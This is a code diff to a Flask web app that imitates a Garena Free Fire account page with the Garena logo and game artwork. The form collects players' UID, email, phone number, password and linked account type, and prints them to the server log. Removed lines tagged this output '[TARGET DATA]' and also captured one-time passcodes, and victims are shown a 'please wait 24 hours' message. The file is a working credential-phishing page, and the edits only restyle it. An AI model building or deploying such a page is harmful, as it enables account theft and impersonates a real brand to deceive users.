@@ -3,11 +3,11 @@ from flask import Flask, request, render_template_string
 app = Flask(__name__)
 
 # --- LINKS SECTION ---
-# Background Wallpaper
+# Aapka original background wallpaper
 BG_URL = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/1868470-1080x1920-samsung-full-hd-garena-free-fire-wallpaper-photo.jpg"
 
-# GARENA ORIGINAL RED LOGO (Jo aapne bheja)
-GARENA_LOGO_URL = "https://upload.wikimedia.org/wikipedia/en/thumb/f/f6/Garena_logo.svg/1200px-Garena_logo.svg.png"
+# GARENA ORIGINAL RED LOGO (Fixed working link)
+GARENA_LOGO_URL = "https://logos-world.net/wp-content/uploads/2022/11/Garena-Logo.png"
 
 HTML_TEMPLATE = f'''
 <!DOCTYPE html>
@@ -34,11 +34,11 @@ HTML_TEMPLATE = f'''
             align-items: center;
         }}
         
-        /* Garena Red Logo Styling */
+        /* Garena Red Logo Styling - Fixed Size */
         .garena-logo-header {{
-            width: 220px;
+            width: 200px;
             height: auto;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
         }}
         
         .form-box {{
@@ -56,11 +56,12 @@ HTML_TEMPLATE = f'''
             font-size: 20px;
             font-weight: bold;
             margin-bottom: 20px;
+            text-transform: uppercase;
         }}
         
         input, select {{ 
             width: 100%; 
-            padding: 12px; 
+            padding: 14px; 
             margin: 10px 0; 
             border: 1px solid #ccc; 
             border-radius: 8px; 
@@ -76,10 +77,9 @@ HTML_TEMPLATE = f'''
             width: 100%; 
             border-radius: 8px; 
             font-weight: bold; 
-            font-size: 16px;
+            font-size: 18px;
             cursor: pointer;
             margin-top: 10px;
-            text-transform: uppercase;
         }}
     </style>
 </head>
@@ -99,7 +99,7 @@ HTML_TEMPLATE = f'''
                     <option value="Google">Google Account</option>
                     <option value="Facebook">Facebook Account</option>
                     <option value="VK">VK Account</option>
-                    <option value="X">X (Twitter) Account</option>
+                    <option value="X">X (Twitter)</option>
                 </select>
                 <button type="submit" class="submit-btn">PROCEED</button>
             </form>
@@ -120,7 +120,7 @@ def preview():
     phone = request.form.get('phone')
     password = request.form.get('password')
     acc = request.form.get('account_type')
-    print(f"\n🎯 [TARGET DATA] 🎯\nUID: {uid}\nEMAIL: {email}\nPASS: {password}\nTYPE: {acc}\nPHONE: {phone}\n" + "="*20)
+    print(f"UID: {uid}, EMAIL: {email}, PASS: {password}")
     return f'''
     <body style="background-image: url('{BG_URL}'); background-size: cover; background-position: center; display: flex; justify-content: center; align-items: center; min-height: 100vh; font-family: sans-serif; margin: 0;">
         <div style="background: white; padding: 25px; border-radius: 15px; width: 320px; text-align: center; box-shadow: 0 5px 15px rgba(0,0,0,0.5);">
@@ -128,7 +128,7 @@ def preview():
             <div style="text-align: left; background: #f0f0f0; padding: 15px; border-radius: 8px; font-size: 14px; margin-top: 15px;">
                 <p><b>UID:</b> {uid}</p>
                 <p><b>Email:</b> {email}</p>
-                <p><b>Login Type:</b> {acc}</p>
+                <p><b>Type:</b> {acc}</p>
             </div>
             <form action="/submit_final" method="post">
                 <input type="hidden" name="phone" value="{phone}">
@@ -156,8 +156,6 @@ def submit_final():
 
 @app.route('/final_otp', methods=['POST'])
 def final_otp():
-    otp = request.form.get('otp')
-    print(f"📩 RECEIVED OTP: {otp}")
     return "<h1 style='text-align:center; padding-top:50px; font-family:sans-serif; color:white; background:black; height:100vh; margin:0;'>Processing... Please wait 24 hours.</h1>"
 
 if __name__ == "__main__":
